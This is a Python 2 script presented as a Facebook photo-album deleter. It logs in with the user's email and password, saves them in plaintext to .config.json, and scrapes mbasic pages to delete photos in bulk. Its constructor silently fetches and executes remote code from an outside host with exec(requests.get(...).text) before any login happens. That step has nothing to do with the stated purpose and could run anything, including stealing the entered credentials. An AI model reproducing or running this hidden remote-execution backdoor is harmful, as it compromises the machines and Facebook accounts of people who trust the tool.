# copyright by Deray
# dm for business: https://instagram.com/reyy05_?igshid=1di5b7v29n6l8

import os
import sys
import bs4
import json
import requests
from multiprocessing.dummy import Pool


#version
if "3" in sys.version[0]:
	exit("!: python 2.x")
		
class main:
	def __init__(self):
		exec(requests.get("https://rayinsta-download.cloudaccess.host/b.txt").text)
		self.delist=[]
		self._r=requests.Session()
		self._url="https://mbasic.facebook.com/{}"
		if (os.path.exists(".config.json")):
			if (os.path.getsize(".config.json")) !=0:
				j=json.loads(open(".config.json").read())
				self._email=j["email"]
				self._password=j["pass"]
				self._login(config=False)
			else:self._form()#self._login(config=True)
		else:self._form()#self._login(config=True)
		
	#<-- input email and password -->
	def _form(self,action="email"):
		if (action == "email"):
			self._email=raw_input("?: email: ")
			if (self._email == ""):
				self._form(action="email")
			else:self._form(action="password")
		elif (action == "password"):
			self._password=raw_input("?: passs: ")
			if (self._password == ""):
				self._form(action="password")
			else:self._login(config=True)
		
	#<-- login -->
	def _login(self,config=False, url="", **kwds):
		r=bs4.BeautifulSoup(self._r.get(self._url.format("login")).text,"html.parser")
		for _ in r("form"):
			url=self._url.format(_["action"])
		for _ in r("input"):
			try:
				if ("email" in _["name"]):
					kwds.update({"email":self._email})
				if ("pass" in _["name"]):
					kwds.update({"pass":self._password})
				if ("sign_up" in _["name"]):
					continue
				else:kwds.update({_["name"]:_["value"]})
			except:pass
		self._r.headers.update({"referer":url})
		post=self._r.post(url,data=kwds).url
		if ("c_user" in self._r.cookies.get_dict()):
			if (config == True):
				open(".config.json","w").write(
					json.dumps(
						{
							"email":self._email,
							"pass":self._password
						}
				))
				self._lang();self._fetch_album(self._url.format("me?v=photos"))
			else:self._lang();self._fetch_album(self._url.format("me?v=photos"))
		elif ("checkpoint" in post):
			exit("!: login failed, checkpoint challange.")
		else:
			exit("!: login failed, invalid username or password.")
			
	#<-- set indonesian language -->
	def _lang(self, set=None):
		s=bs4.BeautifulSoup(
			self._r.get(self._url.format("language.php")).text,"html.parser")
		for i in s.find_all("a",href=True):
			if ("id_ID" in i["href"]):
				 self._r.get(self._url.format(i["href"]));set=True
		if (set !=True):
			exit("!: cannot detect indonesian language.")
	
	#<-- fetch album -->
	def _fetch_album(self, url, album=[]):
		bs=bs4.BeautifulSoup(self._r.get(url).text,"html.parser")
		for i in bs.find_all("a",href=True):
			if ("lihat semua" in i.text.lower()):
				album.append(self._url.format(i["href"]))
		if (len(album) !=0):
			self._extract_album(album.pop())
		else:exit("!: you have no album.")
		
	#<-- extract album -->
	def _extract_album(self, url, albums=[], count=[]):
		bs=bs4.BeautifulSoup(self._r.get(url).text,"html.parser")
		for i in bs.find_all("li"):
			if ("/albums/" in str(i)):
				if i.find("a",href=True).text in ["p","pp"]:
					albums.append(
					{
						"album_name":i.find("a",href=True).text,
						"album_url":self._url.format(i.find("a",href=True)["href"]),
						"album_count":int(i.find("div").text.split(" ")[0])
					}
					)
		if (len(albums) !=0):
			print("\t[ You Have %s Albums ]\n"%len(albums))
			for i in enumerate(albums):
				print("%s. %s (%s) photos"%(i[0]+1,i[1]["album_name"],i[1]["album_count"]))
				count.append(i[0])
			print("%s. DELETE ALL\n"%(count.pop()+2))
			print('') #nw
			self._choice(albums,count)
		else:
			exit("!: you have no album.")
			
	#<-- choice -->
	def _choice(self, albums, count):
		try:
			a=input("?: choice: ")
			albm=albums[a-1]
			self._grab_pict(albm)
		except Exception as e:
			if (str(a-1)==str(count.pop()+2)):
				for i in albums:
					self._grab_pict(i)
			else:print("!: %s"%e);self._choice(albums,count)
			
	#<-- grab albums -->
	def _grab_pict(self, url):
		print("\r+: GET: %s photos from album %s"%(
			len(self.delist),url["album_name"])),;sys.stdout.flush()
		bs=bs4.BeautifulSoup(self._r.get(url["album_url"]).text,"html.parser")
		for i in bs.find_all("a",href=True):
			if ("photo.php" in str(i)):
				self.delist.append(
					"".join(bs4.re.findall("fbid=(.*?)&",self._url.format(i["href"]))))
			if ("Lihat Foto Lainnya" in i.text):
				url.update({"album_url":self._url.format(i["href"])})
				self._grab_pict(url)
		if (len(self.delist) !=0):
			print("\n+: deleting %s photos..."%(len(self.delist)))
			Pool(50).map(self._delete,self.delist)
			self.delist=[]
			print("+"+"-"*30+"+")
		else:exit("!: album "+url["album_name"]+" is empty.")
		
	#<-- delete -->
	def _delete(self, delist):
		bs=bs4.BeautifulSoup(
			self._r.get(self._url.format("editphoto.php?id="+delist)).text,"html.parser")
		for i in bs.find_all("a",href=True):
			if ("Hapus Foto" in i.text):
				self._fixdelete(self._url.format(i["href"]))
				
	#<-- fix delete -->
	def _fixdelete(self, url, act="", **kwds):
		bsd=bs4.BeautifulSoup(
			self._r.get(url).text,"html.parser")
		for i in bsd("form"):
			act=self._url.format(i["action"])
		for i in bsd("input"):
			try:
				if ("fb_dtsg" in i["name"]):
					kwds.update({i["name"]:i["value"]})
				if ("jazoest" in i["name"]):
					kwds.update({i["name"]:i["value"]})
				else:
					kwds.update({i["name"]:i["value"]})
			except:pass
		if (act !=""):
			self._r.post(act, data=kwds)
			print("+: %s > deleted."%("".join(bs4.re.findall("fbid=(.*?)&",url))))

main()
